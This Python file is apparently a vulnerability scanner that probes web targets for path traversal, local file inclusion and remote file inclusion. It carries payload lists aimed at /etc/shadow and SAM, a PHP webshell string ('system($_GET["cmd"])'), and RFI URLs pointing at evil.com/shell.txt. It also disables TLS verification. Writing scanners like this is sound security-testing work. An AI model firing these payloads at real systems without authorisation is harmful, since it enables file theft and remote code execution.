"""
Jarwis AGI Pen Test - Path Traversal & LFI/RFI Scanner
Detects Local/Remote File Inclusion vulnerabilities (A01:2021 - Broken Access Control)
Based on Web Hacking 101 techniques - adapted for 2025
"""

import asyncio
import logging
from typing import Dict, List, Optional, Any
from dataclasses import dataclass
from urllib.parse import urlparse, urljoin, quote
import aiohttp
import ssl

logger = logging.getLogger(__name__)


@dataclass
class ScanResult:
    id: str
    category: str
    severity: str
    title: str
    description: str
    url: str
    method: str
    parameter: str = ""
    evidence: str = ""
    remediation: str = ""
    cwe_id: str = ""
    poc: str = ""
    reasoning: str = ""
    request_data: str = ""
    response_data: str = ""


class PathTraversalScanner:
    """
    Scans for Path Traversal/Directory Traversal vulnerabilities
    OWASP A01:2021 - Broken Access Control
    
    Attack vectors:
    - Classic ../ traversal
    - URL encoding bypass
    - Double encoding bypass
    - Unicode/UTF-8 bypass
    - Null byte injection
    - Wrapper bypass (PHP streams)
    """
    
    # Target files to read
    TARGET_FILES = {
        'unix': [
            '/etc/passwd',
            '/etc/shadow',
            '/etc/hosts',
            '/etc/hostname',
            '/proc/self/environ',
            '/proc/version',
            '/var/log/apache2/access.log',
            '/var/log/nginx/access.log',
            '/home/.bash_history',
        ],
        'windows': [
            'C:/Windows/win.ini',
            'C:/Windows/System32/drivers/etc/hosts',
            'C:/inetpub/wwwroot/web.config',
            'C:/Windows/System32/config/SAM',
            'C:/boot.ini',
        ],
    }
    
    # Traversal payloads with various bypass techniques
    TRAVERSAL_PAYLOADS = [
        # Basic traversal
        '../',
        '..\\',
        '../../../',
        '..\\..\\..\\',
        
        # URL encoding
        '%2e%2e%2f',
        '%2e%2e/',
        '..%2f',
        '%2e%2e%5c',
        '..%5c',
        
        # Double URL encoding
        '%252e%252e%252f',
        '%252e%252e/',
        '..%252f',
        
        # 16-bit Unicode
        '..%c0%af',
        '..%c1%9c',
        '%c0%ae%c0%ae%c0%af',
        
        # UTF-8 encoding
        '..%ef%bc%8f',
        
        # Mixed encoding
        '....//....//....//..../',
        '....\\\\....\\\\....\\\\',
        '....//',
        '....\\\\',
        
        # Null byte
        '../%00',
        '..\\%00',
        
        # Wrapper bypass (start with file:// etc)
        'file:///',
        
        # Filter bypass
        '....//....//....//....//',
        '....//..///..../',
        '..;/',
    ]
    
    # Common vulnerable parameters
    VULN_PARAMS = [
        'file', 'path', 'page', 'document', 'folder', 'root', 'dir',
        'pg', 'style', 'pdf', 'template', 'php_path', 'doc', 'img',
        'image', 'filename', 'include', 'inc', 'locate', 'show',
        'site', 'type', 'view', 'content', 'layout', 'mod', 'conf',
        'url', 'name', 'cat', 'action', 'board', 'date', 'detail',
        'download', 'prefix', 'read', 'src', 'lang', 'language',
    ]
    
    # File content signatures
    FILE_SIGNATURES = {
        'unix_passwd': ['root:', 'daemon:', 'bin:', 'nobody:', '/bin/bash', '/bin/sh'],
        'windows_ini': ['[fonts]', '[extensions]', 'for 16-bit app support'],
        'hosts': ['127.0.0.1', 'localhost', '::1'],
        'proc_version': ['Linux version', 'gcc version'],
    }
    
    def __init__(self, config: dict, context):
        self.config = config
        self.context = context
        self.results: List[ScanResult] = []
        self.rate_limit = config.get('rate_limit', 10)
        self.timeout = config.get('timeout', 15)
        self.ssl_context = ssl.create_default_context()
        self.ssl_context.check_hostname = False
        self.ssl_context.verify_mode = ssl.CERT_NONE
        
    async def scan(self) -> List[ScanResult]:
        """Main scan method"""
        logger.info("Starting Path Traversal scan...")
        self.results = []
        
        base_url = self.config.get('target', {}).get('url', '')
        if not base_url:
            base_url = self.config.get('target_url', '')
        
        if not base_url:
            return self.results
        
        connector = aiohttp.TCPConnector(ssl=self.ssl_context, limit=10)
        
        async with aiohttp.ClientSession(
            connector=connector,
            timeout=aiohttp.ClientTimeout(total=self.timeout)
        ) as session:
            
            # Test discovered endpoints
            if hasattr(self.context, 'endpoints'):
                for endpoint in self.context.endpoints[:30]:
                    ep_url = endpoint.get('url', '') if isinstance(endpoint, dict) else str(endpoint)
                    if ep_url:
                        await self._test_traversal(session, ep_url)
            
            # Test common vulnerable paths
            vuln_paths = [
                '/view.php', '/download.php', '/read.php', '/get.php',
                '/file.php', '/include.php', '/page.php', '/index.php',
                '/image.php', '/show.php', '/template.php', '/load.php',
            ]
            
            for path in vuln_paths:
                url = urljoin(base_url, path)
                await self._test_traversal(session, url)
        
        logger.info(f"Path traversal scan complete. Found {len(self.results)} vulnerabilities")
        return self.results
    
    async def _test_traversal(self, session: aiohttp.ClientSession, url: str):
        """Test URL for path traversal"""
        
        # Test each parameter with traversal payloads
        for param in self.VULN_PARAMS[:15]:  # Limit parameters
            for payload_base in self.TRAVERSAL_PAYLOADS[:10]:  # Limit payloads
                for target_file in self.TARGET_FILES['unix'][:3]:  # Limit files
                    # Build full payload
                    depth = 8  # Deep traversal
                    payload = payload_base * depth + target_file.lstrip('/')
                    
                    await self._send_traversal(session, url, param, payload, target_file)
    
    async def _send_traversal(self, session: aiohttp.ClientSession, url: str, 
                             param: str, payload: str, target_file: str):
        """Send traversal payload and check response"""
        try:
            await asyncio.sleep(1 / self.rate_limit)
            
            separator = '&' if '?' in url else '?'
            test_url = f"{url}{separator}{param}={quote(payload, safe='')}"
            
            headers = {'User-Agent': 'Mozilla/5.0'}
            
            async with session.get(test_url, headers=headers) as response:
                body = await response.text()
                
                # Check for file content signatures
                if self._check_file_content(body, target_file):
                    result = ScanResult(
                        id=f"TRAVERSAL-{len(self.results)+1}",
                        category="A01:2021 - Broken Access Control",
                        severity="critical",
                        title=f"Path Traversal: {target_file}",
                        description=f"Directory traversal allows reading {target_file}",
                        url=test_url,
                        method="GET",
                        parameter=param,
                        evidence=body[:300] if len(body) > 300 else body,
                        remediation="Validate and sanitize file paths. Use whitelist of allowed files.",
                        cwe_id="CWE-22",
                        poc=payload,
                        reasoning=f"File content from {target_file} detected in response"
                    )
                    self.results.append(result)
                    return
                    
        except Exception as e:
            logger.debug(f"Path traversal test error: {e}")
    
    def _check_file_content(self, body: str, target_file: str) -> bool:
        """Check if response contains expected file content"""
        body_lower = body.lower()
        
        if 'passwd' in target_file:
            return any(sig in body for sig in self.FILE_SIGNATURES['unix_passwd'])
        elif 'win.ini' in target_file:
            return any(sig in body_lower for sig in self.FILE_SIGNATURES['windows_ini'])
        elif 'hosts' in target_file:
            return any(sig in body for sig in self.FILE_SIGNATURES['hosts'])
        elif 'proc/version' in target_file:
            return any(sig in body for sig in self.FILE_SIGNATURES['proc_version'])
        
        return False


class LFIScanner:
    """
    Scans for Local File Inclusion (LFI) vulnerabilities
    OWASP A03:2021 - Injection
    
    Advanced LFI techniques:
    - PHP wrappers (php://, data://, zip://)
    - Log poisoning
    - Proc/self exploitation
    - Session file inclusion
    """
    
    # PHP wrapper payloads
    PHP_WRAPPERS = [
        # php://filter for reading source code
        'php://filter/convert.base64-encode/resource=',
        'php://filter/read=string.rot13/resource=',
        'php://filter/read=convert.base64-encode/resource=',
        
        # php://input for RCE
        'php://input',
        
        # data:// for RCE
        'data://text/plain;base64,',
        'data://text/plain,<?php system($_GET["cmd"]);?>',
        
        # expect:// for RCE (if enabled)
        'expect://id',
        
        # zip:// for RCE
        'zip://shell.zip#shell.php',
        
        # phar:// for RCE
        'phar://shell.phar/shell.php',
    ]
    
    # Target files for LFI
    LFI_TARGETS = [
        'index.php',
        'config.php',
        'database.php',
        'db.php',
        'settings.php',
        '../config.php',
        '../../config/config.php',
        'wp-config.php',
        '.htaccess',
        '../.env',
        '../../.env',
    ]
    
    def __init__(self, config: dict, context):
        self.config = config
        self.context = context
        self.results: List[ScanResult] = []
        self.rate_limit = config.get('rate_limit', 10)
        self.timeout = config.get('timeout', 15)
        self.ssl_context = ssl.create_default_context()
        self.ssl_context.check_hostname = False
        self.ssl_context.verify_mode = ssl.CERT_NONE
        
    async def scan(self) -> List[ScanResult]:
        """Main scan method"""
        logger.info("Starting LFI scan...")
        self.results = []
        
        base_url = self.config.get('target', {}).get('url', '')
        if not base_url:
            base_url = self.config.get('target_url', '')
        
        if not base_url:
            return self.results
        
        connector = aiohttp.TCPConnector(ssl=self.ssl_context, limit=10)
        
        async with aiohttp.ClientSession(
            connector=connector,
            timeout=aiohttp.ClientTimeout(total=self.timeout)
        ) as session:
            
            # Test discovered endpoints
            if hasattr(self.context, 'endpoints'):
                for endpoint in self.context.endpoints[:25]:
                    ep_url = endpoint.get('url', '') if isinstance(endpoint, dict) else str(endpoint)
                    if ep_url:
                        await self._test_php_wrappers(session, ep_url)
            
            # Test common vulnerable paths
            vuln_paths = [
                '/index.php', '/page.php', '/include.php',
                '/view.php', '/template.php', '/load.php',
            ]
            
            for path in vuln_paths:
                url = urljoin(base_url, path)
                await self._test_php_wrappers(session, url)
        
        logger.info(f"LFI scan complete. Found {len(self.results)} vulnerabilities")
        return self.results
    
    async def _test_php_wrappers(self, session: aiohttp.ClientSession, url: str):
        """Test PHP wrapper exploitation"""
        
        # Parameters commonly vulnerable to LFI
        params = ['page', 'file', 'include', 'path', 'template', 'view']
        
        for param in params:
            # Test php://filter to read source
            for target in self.LFI_TARGETS[:5]:
                wrapper = f'php://filter/convert.base64-encode/resource={target}'
                await self._send_lfi(session, url, param, wrapper, 'php_filter')
            
            # Test php://input
            await self._test_php_input(session, url, param)
    
    async def _send_lfi(self, session: aiohttp.ClientSession, url: str,
                        param: str, payload: str, attack_type: str):
        """Send LFI payload"""
        try:
            await asyncio.sleep(1 / self.rate_limit)
            
            separator = '&' if '?' in url else '?'
            test_url = f"{url}{separator}{param}={quote(payload, safe='')}"
            
            headers = {'User-Agent': 'Mozilla/5.0'}
            
            async with session.get(test_url, headers=headers) as response:
                body = await response.text()
                
                if attack_type == 'php_filter':
                    # Check for base64 encoded PHP source
                    import re
                    base64_pattern = r'^[A-Za-z0-9+/=]{50,}$'
                    
                    # Look for base64 strings in response
                    if re.search(base64_pattern, body, re.MULTILINE):
                        result = ScanResult(
                            id=f"LFI-FILTER-{len(self.results)+1}",
                            category="A03:2021 - Injection",
                            severity="high",
                            title="PHP Filter LFI - Source Code Disclosure",
                            description="php://filter wrapper allows reading PHP source code.",
                            url=test_url,
                            method="GET",
                            parameter=param,
                            evidence="Base64 encoded PHP source returned",
                            remediation="Validate file paths. Disable allow_url_include.",
                            cwe_id="CWE-98",
                            poc=payload,
                            reasoning="php://filter successfully read source code"
                        )
                        self.results.append(result)
                        return
                        
        except Exception as e:
            logger.debug(f"LFI test error: {e}")
    
    async def _test_php_input(self, session: aiohttp.ClientSession, url: str, param: str):
        """Test php://input for RCE"""
        try:
            await asyncio.sleep(1 / self.rate_limit)
            
            separator = '&' if '?' in url else '?'
            test_url = f"{url}{separator}{param}=php://input"
            
            # Send PHP code in body
            php_code = '<?php echo "jarwis_lfi_test"; ?>'
            
            headers = {
                'User-Agent': 'Mozilla/5.0',
                'Content-Type': 'application/x-www-form-urlencoded'
            }
            
            async with session.post(test_url, data=php_code, headers=headers) as response:
                body = await response.text()
                
                if 'jarwis_lfi_test' in body:
                    result = ScanResult(
                        id=f"LFI-INPUT-{len(self.results)+1}",
                        category="A03:2021 - Injection",
                        severity="critical",
                        title="LFI to RCE via php://input",
                        description="php://input wrapper allows remote code execution.",
                        url=test_url,
                        method="POST",
                        parameter=param,
                        evidence="PHP code executed successfully",
                        remediation="Disable allow_url_include. Validate all file paths.",
                        cwe_id="CWE-98",
                        poc="php://input with PHP code in POST body",
                        reasoning="PHP code executed via php://input"
                    )
                    self.results.append(result)
                    
        except Exception as e:
            logger.debug(f"PHP input test error: {e}")


class RFIScanner:
    """
    Scans for Remote File Inclusion (RFI) vulnerabilities
    OWASP A03:2021 - Injection
    
    RFI allows including remote files which can lead to:
    - Remote Code Execution
    - Data theft
    - Backdoor installation
    """
    
    # Dummy RFI URLs (would need actual server for real testing)
    RFI_PAYLOADS = [
        'http://evil.com/shell.txt',
        'https://evil.com/shell.txt',
        'ftp://evil.com/shell.txt',
        '//evil.com/shell.txt',  # Protocol-relative
        'http://127.0.0.1/shell.txt',  # SSRF variant
    ]
    
    # Common vulnerable parameters
    VULN_PARAMS = [
        'page', 'file', 'include', 'path', 'url', 'src',
        'template', 'document', 'site', 'require',
    ]
    
    def __init__(self, config: dict, context):
        self.config = config
        self.context = context
        self.results: List[ScanResult] = []
        self.rate_limit = config.get('rate_limit', 10)
        self.timeout = config.get('timeout', 15)
        self.ssl_context = ssl.create_default_context()
        self.ssl_context.check_hostname = False
        self.ssl_context.verify_mode = ssl.CERT_NONE
        
    async def scan(self) -> List[ScanResult]:
        """Main scan method"""
        logger.info("Starting RFI scan...")
        self.results = []
        
        base_url = self.config.get('target', {}).get('url', '')
        if not base_url:
            base_url = self.config.get('target_url', '')
        
        if not base_url:
            return self.results
        
        connector = aiohttp.TCPConnector(ssl=self.ssl_context, limit=10)
        
        async with aiohttp.ClientSession(
            connector=connector,
            timeout=aiohttp.ClientTimeout(total=self.timeout)
        ) as session:
            
            # Test discovered endpoints
            if hasattr(self.context, 'endpoints'):
                for endpoint in self.context.endpoints[:20]:
                    ep_url = endpoint.get('url', '') if isinstance(endpoint, dict) else str(endpoint)
                    if ep_url:
                        await self._test_rfi(session, ep_url)
        
        logger.info(f"RFI scan complete. Found {len(self.results)} vulnerabilities")
        return self.results
    
    async def _test_rfi(self, session: aiohttp.ClientSession, url: str):
        """Test for RFI vulnerabilities"""
        
        for param in self.VULN_PARAMS[:8]:
            for payload in self.RFI_PAYLOADS[:3]:
                try:
                    await asyncio.sleep(1 / self.rate_limit)
                    
                    separator = '&' if '?' in url else '?'
                    test_url = f"{url}{separator}{param}={quote(payload, safe='')}"
                    
                    headers = {'User-Agent': 'Mozilla/5.0'}
                    
                    async with session.get(test_url, headers=headers) as response:
                        body = await response.text()
                        
                        # Check for signs of RFI attempt being processed
                        # In real scenarios, you'd need an external server to catch callbacks
                        rfi_indicators = [
                            'failed to open stream',
                            'include(http://',
                            'require(http://',
                            'fopen failed',
                            'allow_url_include',
                        ]
                        
                        if any(ind in body.lower() for ind in rfi_indicators):
                            result = ScanResult(
                                id=f"RFI-{len(self.results)+1}",
                                category="A03:2021 - Injection",
                                severity="critical",
                                title="Remote File Inclusion Attempt Detected",
                                description="Server attempts to include remote URLs in file functions.",
                                url=test_url,
                                method="GET",
                                parameter=param,
                                evidence="Remote include error in response",
                                remediation="Disable allow_url_include. Validate all file paths.",
                                cwe_id="CWE-98",
                                poc=payload,
                                reasoning="Server attempted to load remote file"
                            )
                            self.results.append(result)
                            return
                            
                except Exception as e:
                    logger.debug(f"RFI test error: {e}")
